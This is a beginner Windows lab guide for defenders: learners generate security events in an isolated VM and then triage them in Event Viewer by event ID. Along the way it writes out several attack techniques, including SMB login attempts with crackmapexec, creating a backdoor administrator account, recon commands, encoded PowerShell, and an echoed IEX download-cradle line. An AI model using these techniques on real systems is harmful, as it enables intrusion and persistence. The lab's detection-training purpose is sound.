# Windows Basics Lab

**Difficulty:** 🟢 Beginner

**Time:** 45 minutes

**Focus:** Windows event logging, local reconnaissance, and basic triage skills.

## Goal

Generate security-relevant events on a Windows system, find them in Event Viewer, and practise the fundamentals of Windows-based incident investigation.

## Prerequisites

- [ ] Windows 10 or 11 VM (evaluation ISO is fine)
- [ ] Admin access to the Windows VM
- [ ] (Optional) Wazuh agent installed for centralised logging
- [ ] (Optional) Kali VM for external perspective

## Topology

```
┌──────────────┐                    ┌──────────────┐
│    Kali      │◄──────────────────►│  Windows 10  │
│  Attacker    │   Isolated Net     │   Target     │
│ 10.10.10.10  │   10.10.10.0/24    │ 10.10.10.20  │
│  (optional)  │                    │              │
└──────────────┘                    └──────────────┘
```

For this lab, most work happens directly on the Windows VM. Kali is optional.

## Build steps

### Step 1: Configure Windows audit policy

By default, Windows doesn't log everything useful. Let's enable more logging.

Open an elevated PowerShell (Run as Administrator):

```powershell
# Enable command line logging in process creation events
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f

# Enable PowerShell script block logging
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
```

Configure audit policy for logon events:

```powershell
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Account Lockout" /success:enable /failure:enable
auditpol /set /subcategory:"User Account Management" /success:enable /failure:enable
```

### Step 2: Verify logging is working

Open Event Viewer: `Win + R`, type `eventvwr.msc`

Navigate to: Windows Logs > Security

You should see events. If it's empty, the audit policy isn't applied yet (try rebooting).

### Step 3: Snapshot

Snapshot the Windows VM: `lab-windows-ready`

## Run the scenario

### Activity 1: Generate failed logins

Let's create some failed login events.

**Method 1: Local failed logins**

Lock the screen (`Win + L`), then try logging in with wrong passwords a few times.

**Method 2: Remote failed logins (if Kali available)**

From Kali:

```bash
# Try SSH (if enabled) or SMB with wrong creds
crackmapexec smb 10.10.10.20 -u administrator -p wrongpassword1
crackmapexec smb 10.10.10.20 -u administrator -p wrongpassword2
crackmapexec smb 10.10.10.20 -u administrator -p wrongpassword3
```

**Finding the events:**

In Event Viewer: Windows Logs > Security

Filter by Event ID 4625 (failed logon).

**What you should see:** Each failed attempt logged with source IP, username attempted, failure reason.

### Activity 2: Create a suspicious user

An attacker with local access often creates a backdoor account. Let's simulate that.

In elevated command prompt:

```cmd
net user hacker Password123! /add
net localgroup Administrators hacker /add
```

**Finding the events:**

In Event Viewer, look for:
- Event ID 4720: User account created
- Event ID 4732: Member added to security-enabled local group

**What you should see:** The new user creation and the addition to Administrators group, with timestamps.

### Activity 3: Run suspicious commands

Attackers run commands to understand the system. Let's generate some.

In command prompt:

```cmd
whoami
hostname
ipconfig /all
net user
net localgroup administrators
systeminfo
tasklist
netstat -ano
```

**Finding the events:**

If process creation auditing is enabled, look for Event ID 4688.

Navigate to: Windows Logs > Security, filter for 4688.

**What you should see:** Each command execution logged (though command line content depends on your audit config).

### Activity 4: Run suspicious PowerShell

PowerShell is heavily used in attacks. Let's generate some logs.

In PowerShell:

```powershell
# Encoded command (common in attacks)
$cmd = "whoami"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded

# Download cradle pattern (don't actually download anything malicious)
# This just shows the pattern
Write-Host "IEX(New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"

# Get system info via PowerShell
Get-ComputerInfo | Select-Object WindowsProductName, OsHardwareAbstractionLayer
Get-Process | Select-Object -First 10
Get-NetTCPConnection | Where-Object State -eq 'Established'
```

**Finding the events:**

Navigate to: Applications and Services Logs > Microsoft > Windows > PowerShell > Operational

Also check: Windows PowerShell log

Look for Event ID 4104 (script block logging) which captures the actual PowerShell code.

### Activity 5: Practise basic triage

Now pretend you're the defender. You've been told "something suspicious happened around [time of your activities]."

Your task:
1. Find evidence of the new user account
2. Find evidence of reconnaissance commands
3. Find evidence of PowerShell usage
4. Document the timeline

**Approach:**

1. Open Event Viewer
2. Go to Security log
3. Filter to the time range of your activities
4. Look for the event IDs you know about
5. Take notes on what you find

### Success criteria

You've successfully:
- Generated security-relevant events
- Located them in Event Viewer
- Understood which Event IDs mean what
- Practised basic investigation

## Detection goals

| Event ID | Log | What it indicates |
|----------|-----|-------------------|
| 4624 | Security | Successful logon |
| 4625 | Security | Failed logon |
| 4720 | Security | User account created |
| 4732 | Security | Member added to group |
| 4688 | Security | Process created |
| 4104 | PowerShell | Script block executed |
| 4103 | PowerShell | Module logging |

### Building a timeline

For incident response, timeline is everything. From your activities:

| Time | Event ID | What happened |
|------|----------|---------------|
| HH:MM | 4625 | Failed login attempt |
| HH:MM | 4720 | User 'hacker' created |
| HH:MM | 4732 | 'hacker' added to Administrators |
| HH:MM | 4688 | `whoami` executed |
| HH:MM | 4104 | PowerShell script block logged |

This is how real incident timelines are built.

## Reset steps

1. Remove the test user:
   ```cmd
   net user hacker /delete
   ```

2. Revert to snapshot if you want a completely clean state

3. Clear Security log if desired (in Event Viewer, right-click > Clear Log)

## Debrief questions

1. **Which events were easiest to find?** Which required more digging?

2. **What's the difference between 4624 and 4625?** Why do both matter?

3. **If you were an attacker, how might you avoid generating these logs?** (Research "log evasion")

4. **What additional logging would you enable?** Look into Sysmon.

5. **How would centralised logging (SIEM) make this easier?**

## Portfolio notes

For your portfolio, capture:

- [ ] Screenshot of Event ID 4720 showing user creation
- [ ] Screenshot of Event ID 4732 showing group modification  
- [ ] Screenshot of Event ID 4625 showing failed logins
- [ ] Screenshot of PowerShell script block log (4104)
- [ ] Write-up of a mini incident timeline based on your activities

## Further reading

- [Windows Security Log Events](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/)
- [Sysmon - System Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [SANS Windows Forensic Analysis Poster](https://www.sans.org/posters/windows-forensic-analysis/)

## Next steps

- Install Sysmon for more detailed endpoint visibility
- Forward logs to your SIEM and build alerts
- Try the same activities with Wazuh trying to detect them